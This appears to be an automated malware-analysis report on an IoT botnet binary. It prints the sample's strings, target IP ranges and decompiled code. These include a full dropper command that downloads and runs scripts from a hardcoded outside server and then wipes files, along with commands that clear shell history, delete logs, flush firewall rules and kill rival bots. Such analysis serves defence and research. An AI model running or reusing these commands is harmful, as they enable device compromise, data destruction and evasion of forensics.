=============================================================================
========	BINARY ID :af0f2f9d5aa61d74f90a5c724be770d9b349fd56==================================================
================================================================================
================================================================================
========	STRINGS SUMMARY : =====================================================
================================================================================
TOTAL STRINGS COUNT :2517
SUPSCPECTED LINES COUNT :217
SUPSCPECTED STRINGS COUNT (DISTINCT) :28
SUPSCPECTED STRINGS WEIGHT :107
SUSPECT STRING SCORE : [107 / 150] 71%
USER AGENTS STRINGS COUNT :62
STATIC IPs STRINGS COUNT :2
DYNAMIC IPs STRINGS COUNT :199
================================================================================
========	STRINGS DETAILS : =====================================================
================================================================================
================================================================================
========	SUSPECTED STRINGS : =====================================================
================================================================================
nopqrstuvwÃŸ
cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n
/proc/cpuinfo
PING
gethostbyname
\e[0;31mSuccessfully Bruteforced IP: \e[0;33m%s | \e[0;31mUsername: \e[0;33m%s | \e[0;31mPassword: \e[0;33m%s\e[0m
%s cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n x00
cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n
bin*
bot*
busybotnet*
busybotnet
\b/dev/netslink/
/usr/
>%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve ;echo ps aux >> proc ; pkill -9 %d\r\n
pkill -9 %s\r\n
rm -rf /bin/netstat
pkill -9 busybox
pkill -9 perl
/sbin/iptables -F;/sbin/iptables -X
Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc
Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41
Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)
Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285
BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)
Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)
AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)
AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)
AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)
AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)
AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)
AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)
AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)
AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)
AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)
AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)
AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)
magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)
Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)
Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)
MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)
MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)
Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)
%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
http
\bFailed opening raw socket.
Invalid flag "%s"
GETLOCALIP
BOTKILL
Killing Bots
LOOPING PAYLOAD
TELNET
TELNET ON | OFF
NETIS
[NETIS] SCANNER Starting
HTTP
/proc/net/route
/usr/bin/python
/usr/sbin/dropbear
\e[1;36m Void Bot Connected \e[1;31m| \e[1;37mIP: \e[1;35m%s \e[1;31m| \e[1;37mType: \e[1;35m%s \e[1;31m| \e[1;37mVersion: \e[1;35m%s
 !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
No such process
Interrupted system call
No child processes
Too many open files in system
Read-only file system
Level 2 not synchronized
Machine is not on the network
Name not unique on network
Interrupted system call should be restarted
Socket operation on non-socket
Protocol wrong type for socket
Socket type not supported
Network is down
Network is unreachable
Network dropped connection on reset
Software caused connection abort
Connection reset by peer
Transport endpoint is already connected
Transport endpoint is not connected
Connection timed out
Connection refused
Host is down
No route to host
Operation already in progress
Operation now in progress
Unknown host
Host name lookup failure
/bin/sh
 !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~
/etc/hosts
/etc/config/hosts
fdopen_pids
libc/sysdeps/linux/i386/vfork.S
fork.c
getpid.c
kill.c
sigprocmask.c
waitpid.c
spec_flags.4372
strstr.c
_string_syserrmsgs.c
error_msg
inet_ntoa.c
inet_makeaddr.c
gethostbyname.c
gethostbyname_r.c
connect.c
socket.c
__malloc_largebin_index
rand.c
random.c
randtbl
random_r.c
random_poly_info
system.c
__socketcall.c
inet_aton.c
dnslookup.c
get_hosts_byname_r.c
inet_pton4
inet_ntop4
read_etc_hosts_r.c
__read_etc_hosts_r
__socketcall
waitpid
random
connect
numpids
initConnection
inet_pton
sendTCP
__GI_random_r
getpid
getHost
__libc_getpid
makeRandomStr
sendHTTP
system
__open_etc_hosts
__dns_lookup
random_r
gethostbyname_r
tcpcsum
socket
_string_syserrmsgs
__GI_inet_ntoa
srandom_r
__GI_inet_ntoa_r
hostname_to_ip
__GI_srandom_r
Server_Botport
kill
__GI_sigprocmask
inet_addr
connectTimeout
__GI_kill
ngPid
strstr
init_rand
rand
StartTheNetis
HackerScan2
__GI_gethostbyname_r
__GI_inet_ntop
fork
__GI_gethostbyname
__GI_random
__GI_fork
__GI_getpid
inet_aton
processCmd
get_telstate_host
__GI_socket
listFork
srand
sendUDP
inet_ntoa
__libc_system
__get_hosts_byname_r
botkiller
HackerScan
__GI_inet_pton
gethostbyname
__vfork
__libc_waitpid
socket_connect
__GI_waitpid
vfork
srandom
__libc_fork
scanPid
rand_cmwc
inet_ntoa_r
__GI_strstr
__GI_connect
inet_ntop
__GI_inet_aton
hekkertelnet
__GI_vfork
NetisRanges
__GI_inet_addr
__libc_connect
pids
sigprocmask
^8PSh
xAPPSh
PPShl
^8PSh
^8PSh
================================================================================
========	USER AGENTS STRINGS : =====================================================
================================================================================
Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)
Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5
Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0
Opera/6.04 (Windows XP; U) [en]
Opera/9.99 (X11; U; sk)
Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc
Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk
Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41
Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)
Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1
Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)
Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4
Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201
Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911
Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)
Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7
Mozilla/5.0 (PLAYSTATION 3; 3.55)
Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2
wii libnup/1.0
Mozilla/4.0 (PSP (PlayStation Portable); 2.00)
PSP (PlayStation Portable); 2.00
Bunjalloo/0.7.6(Nintendo DS;U;en)
Doris/1.15 [en] (Symbian)
BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1
BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)
Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable
Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable
Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2
Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2
Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3
Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)
AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)
AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)
AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)
AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)
AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)
AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)
AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)
AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)
AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)
AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)
Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)
Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)
MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)
MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)
Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)
%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
================================================================================
========	STATIC IP ADRESSES : =====================================================
================================================================================
191.96.249.102
8.8.8.8
================================================================================
========	DYNAMIC IP MASKS : =====================================================
================================================================================
112.5.%d.%d
117.165.%d.%d
85.3.%d.%d
37.158.%d.%d
95.9.%d.%d
41.252.%d.%d
58.71.%d.%d
104.55.%d.%d
78.186.%d.%d
78.189.%d.%d
221.120.%d.%d
88.5.%d.%d
41.254.%d.%d
103.20.%d.%d
103.47.%d.%d
103.57.%d.%d
45.117.%d.%d
101.51.%d.%d
137.59.%d.%d
1.56.%d.%d
1.188.%d.%d
14.204.%d.%d
27.0.%d.%d
27.8.%d.%d
27.50.%d.%d
27.54.%d.%d
27.98.%d.%d
27.112.%d.%d
27.192.%d.%d
36.32.%d.%d
36.248.%d.%d
39.64.%d.%d
42.4.%d.%d
42.48.%d.%d
42.52.%d.%d
42.56.%d.%d
42.63.%d.%d
42.84.%d.%d
42.176.%d.%d
42.224.%d.%d
43.253.%d.%d
43.230.%d.%d
163.53.%d.%d
62.252.%d.%d
43.245.%d.%d
62.255.%d.%d
123.25.%d.%d
103.54.%d.%d
27.255.%d.%d
103.204.%d.%d
123.24.%d.%d
113.191.%d.%d
81.100.%d.%d
113.188.%d.%d
113.189.%d.%d
94.174.%d.%d
14.160.%d.%d
14.161.%d.%d
14.162.%d.%d
14.163.%d.%d
14.164.%d.%d
14.165.%d.%d
14.166.%d.%d
14.167.%d.%d
14.168.%d.%d
14.169.%d.%d
14.170.%d.%d
14.171.%d.%d
14.172.%d.%d
14.173.%d.%d
14.174.%d.%d
14.175.%d.%d
14.176.%d.%d
14.177.%d.%d
14.178.%d.%d
14.179.%d.%d
14.180.%d.%d
14.181.%d.%d
14.182.%d.%d
14.183.%d.%d
14.184.%d.%d
14.185.%d.%d
14.186.%d.%d
14.187.%d.%d
14.188.%d.%d
14.189.%d.%d
14.190.%d.%d
14.191.%d.%d
45.121.%d.%d
45.120.%d.%d
45.115.%d.%d
43.252.%d.%d
43.240.%d.%d
41.174.%d.%d
49.118.%d.%d
78.188.%d.%d
45.127.%d.%d
103.30.%d.%d
14.33.%d.%d
123.16.%d.%d
202.44.%d.%d
116.93.%d.%d
91.83.%d.%d
41.253.%d.%d
117.173.%d.%d
113.190.%d.%d
146.88.%d.%d
112.196.%d.%d
113.178.%d.%d
112.45.%d.%d
183.223.%d.%d
116.71.%d.%d
103.44.%d.%d
110.235.%d.%d
124.253.%d.%d
211.237.%d.%d
117.175.%d.%d
178.93.%d.%d
111.9.%d.%d
222.252.%d.%d
113.174.%d.%d
113.160.%d.%d
113.161.%d.%d
113.162.%d.%d
113.163.%d.%d
113.164.%d.%d
113.165.%d.%d
113.166.%d.%d
113.167.%d.%d
113.168.%d.%d
113.169.%d.%d
123.17.%d.%d
123.18.%d.%d
123.19.%d.%d
123.20.%d.%d
123.21.%d.%d
123.22.%d.%d
222.253.%d.%d
222.254.%d.%d
222.255.%d.%d
37.247.%d.%d
41.208.%d.%d
183.220.%d.%d
175.201.%d.%d
103.198.%d.%d
50.205.%d.%d
88.248.%d.%d
88.105.%d.%d
88.247.%d.%d
85.105.%d.%d
188.3.%d.%d
103.203.%d.%d
103.55.%d.%d
103.220.%d.%d
183.233.%d.%d
103.242.%d.%d
103.14.%d.%d
103.195.%d.%d
103.214.%d.%d
103.218.%d.%d
103.225.%d.%d
103.228.%d.%d
103.231.%d.%d
103.60.%d.%d
103.248.%d.%d
103.253.%d.%d
103.255.%d.%d
103.35.%d.%d
103.49.%d.%d
103.62.%d.%d
144.48.%d.%d
163.47.%d.%d
223.29.%d.%d
59.153.%d.%d
113.176.%d.%d
113.175.%d.%d
113.177.%d.%d
113.183.%d.%d
202.164.%d.%d
203.134.%d.%d
210.56.%d.%d
49.156.%d.%d
203.210.%d.%d
117.181.%d.%d
117.178.%d.%d
117.177.%d.%d
117.176.%d.%d
117.170.%d.%d
117.171.%d.%d
117.162.%d.%d
112.26.%d.%d
112.27.%d.%d
112.28.%d.%d
112.29.%d.%d
112.30.%d.%d
112.31.%d.%d
203.150.%d.%d
50.233.%d.%d
%d.%d.%d.%d
================================================================================
========	/proc FOLDER ACCESS : =====================================================
================================================================================
/proc/cpuinfo
/proc/net/route
================================================================================
========	HISTORY TEMPERING : =====================================================
================================================================================
history -c;history -w
history -c
rm -rf ~/.bash_history
history -w
================================================================================
========	AUTOINSTALL COMMANDS : =====================================================
================================================================================
cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n
%s cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n x00
cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n
================================================================================
========	FUNCTIONS SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES			: 74232
+++TOTAL FUNCTIONS 			:261
+++LINES PER FUNCTION RATIO 	: 284.413793103448
+++SUSPECTED LINES COUNT 	: 2150
+++SUSPECTED LINES RATIO 	: 2.89632503502533
================================================================================
========	WHILES SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES				: 74232
+++WHILE (TRUE) LINES			: 14674
+++WHILE (TRUE) LINES RATION		:19.7677551460287%
+++WHILE (TRUE) LOOPS COUNT		: 280
================================================================================
========	SYSTEM FILES SUMMARY : ================================================
================================================================================
        "/dev/netslink/",
        "/tmp/",
        "/var/",
        "/dev/",
        "/var/run/",
        "/dev/shm/",
        "/boot/",
        "/usr/"
    char (*v60)[703] = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n";
                    execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
                        execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
                    execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
                        execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
    int32_t v144 = __libc_open("/proc/cpuinfo", 0); // 0x8048f5a
    int32_t v144 = __libc_open("/proc/cpuinfo", 0); // 0x8049122
        sprintf(v147, (int32_t)"%s cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n x00");
    return __libc_system((int32_t)"cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n");
    __libc_system((int32_t)"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*");
    __libc_system((int32_t)"rm -rf /var/log/wtmp");
    __libc_system((int32_t)"rm -rf /var/log/wtmp");
    __libc_system((int32_t)"rm -rf /tmp/*");
    __libc_system((int32_t)"rm -rf /bin/netstat");
                int32_t v149 = __libc_open("/proc/net/route", 0); // 0x80514b0
    int32_t result = access((int32_t)"/usr/bin/python", 0) == -1 ? (int32_t)"ROUTER" : (int32_t)"SERVER"; // 0x80515fe
    int32_t v134 = access((int32_t)"/usr/bin/python", 0) == -1 ? (int32_t)"/usr/sbin/dropbear" : (int32_t)"sshd";
        execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
    if (__libc_open("/dev/null", v146) != v144) {
    int32_t v145 = __GI_fopen((int32_t)"/etc/resolv.conf", (int32_t)&v144); // 0x8056ee5
        int32_t v158 = __GI_fopen((int32_t)"/etc/config/resolv.conf", (int32_t)&v144); // 0x8056f03
int32_t __GI_fopen(int32_t a1, int32_t a2) {
    return _stdio_fopen(a1, (char *)a2, 0, -1);
int32_t _stdio_fopen(int32_t a1, char * a2, int32_t a3, int32_t a4) {
    int32_t v144 = __GI_fopen((int32_t)"/etc/hosts", (int32_t)&v143); // 0x805831d
        result = __GI_fopen((int32_t)"/etc/config/hosts", (int32_t)&v143);
================================================================================
========	IP PATTERNS SUMMARY : =================================================
================================================================================
        "Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",

        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",

        "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",

        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",

        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",

        "BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",

    char (*v58)[15] = "191.96.249.102";

